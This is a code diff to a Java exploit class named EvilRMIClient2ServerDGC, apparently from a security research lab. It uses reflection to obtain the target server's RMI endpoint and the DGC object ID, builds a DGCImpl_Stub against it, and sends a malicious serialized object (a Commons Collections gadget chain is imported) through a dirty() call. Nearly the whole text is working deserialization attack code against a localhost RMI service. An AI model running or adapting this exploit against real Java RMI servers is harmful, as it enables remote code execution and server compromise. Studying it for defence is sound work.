@@ -7,18 +7,11 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.trganda.remote.RemoteService;
 import sun.rmi.server.UnicastRef;
-import sun.rmi.transport.DGCImpl_Stub;
-import sun.rmi.transport.LiveRef;
-import sun.rmi.transport.StreamRemoteCall;
-import sun.rmi.transport.TransportConstants;
+import sun.rmi.transport.*;
+import sun.rmi.transport.tcp.TCPEndpoint;
 
-import javax.net.SocketFactory;
 import java.io.*;
 import java.lang.reflect.*;
-import java.net.InetSocketAddress;
-import java.net.Socket;
-import java.net.SocketException;
-import java.net.UnknownHostException;
 import java.rmi.NotBoundException;
 import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
@@ -91,7 +84,10 @@ public class EvilRMIClient2ServerDGC {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
 
         try {
+            // get remote service
             RemoteService rs = getRemoteService(name);
+
+            // get unicastref info, include target ip:port and ObjID
             Field h = rs.getClass().getSuperclass().getDeclaredField("h");
             h.setAccessible(true);
             InvocationHandler handler = (InvocationHandler) h.get(rs);
@@ -100,33 +96,34 @@ public class EvilRMIClient2ServerDGC {
             ref.setAccessible(true);
             UnicastRef unicastRef = (UnicastRef) ref.get(handler);
 
+            LiveRef innerLiveRef = unicastRef.getLiveRef();
+            // Get the target tcpendpoint
+            Field ep = innerLiveRef.getClass().getDeclaredField("ep");
+            ep.setAccessible(true);
+            TCPEndpoint tcpEndpoint = (TCPEndpoint) ep.get(innerLiveRef);
+            // Get the unicastRef ObjID to refer target DGCImpl_Skel
+            Class a = Class.forName("sun.rmi.transport.DGCClient");
+            Field f = a.getDeclaredField("dgcID");
+            f.setAccessible(true);
+            ObjID dgcID = (ObjID) f.get(null);
+
+            LiveRef targetLiveRef = new LiveRef(dgcID, tcpEndpoint, false);
+            // Create a DGCImpl_Stub object
             Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
             Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
-            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(unicastRef);
+            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(new UnicastRef(targetLiveRef));
 
             Field operations = stub.getClass().getDeclaredField("operations");
             Field interfaceHash = stub.getClass().getDeclaredField("interfaceHash");
-
             operations.setAccessible(true);
             interfaceHash.setAccessible(true);
 
+            // write evil data
             RemoteCall call = stub.getRef().newCall((RemoteObject) stub, (Operation[]) operations.get(stub), 1, (Long) interfaceHash.get(stub));
-            Field liveRef = stub.getRef().getClass().getDeclaredField("ref");
-            liveRef.setAccessible(true);
-            LiveRef liveRefs = (LiveRef) liveRef.get(stub.getRef());
-            Field id = liveRefs.getClass().getDeclaredField("id");
-            id.setAccessible(true);
-            ObjID objID = (ObjID) id.get(liveRefs);
-
             ObjectOutput out = call.getOutputStream();
-
-            ObjID[] objIDs = new ObjID[] { new ObjID(2) };
-
-            new ObjID(2).write(out);
-            out.writeObject(objIDs);
-            out.writeLong(1);
             out.writeObject(create());
 
+            // call dirty()
             stub.getRef().invoke(call);
         } catch (Exception ex) {
             ex.printStackTrace();
